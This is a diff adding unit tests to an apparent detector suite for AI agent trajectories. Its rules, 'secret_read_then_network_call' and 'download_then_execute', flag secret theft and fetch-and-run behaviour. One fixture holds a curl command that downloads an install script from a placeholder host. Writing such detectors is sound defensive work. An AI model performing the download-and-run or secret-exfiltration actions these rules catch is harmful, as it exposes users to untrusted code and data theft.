@@ -87,9 +87,26 @@ describe("secret_read_then_network_call", () => {
 		});
 		expect(secretReadThenNetworkCall.fn(session, candidate)).toEqual([]);
 	});
+
+    it("does not flag a Bash event with no command as outbound traffic", () => {
+        const { session } = makeTrajectoryAtConfidential();
+        expect(secretReadThenNetworkCall.fn(session, makeCandidate({
+            tool_name: "Bash", tool_input: {},
+        }))).toEqual([]);
+    });
 });
 
 describe("download_then_execute", () => {
+    it("does not treat a Bash event without a command as execution", () => {
+        const { session } = buildTrajectoryFixture([{
+            tool_name: "Bash",
+            tool_input: { command: "curl -o /tmp/install.sh https://example.com/install.sh" },
+        }]);
+        expect(downloadThenExecute.fn(session, makeCandidate({
+            tool_name: "Bash", tool_input: {},
+        }))).toEqual([]);
+    });
+
 	it("fires when a recent Bash downloaded a script and candidate runs it", () => {
 		const { session } = buildTrajectoryFixture([
 			{
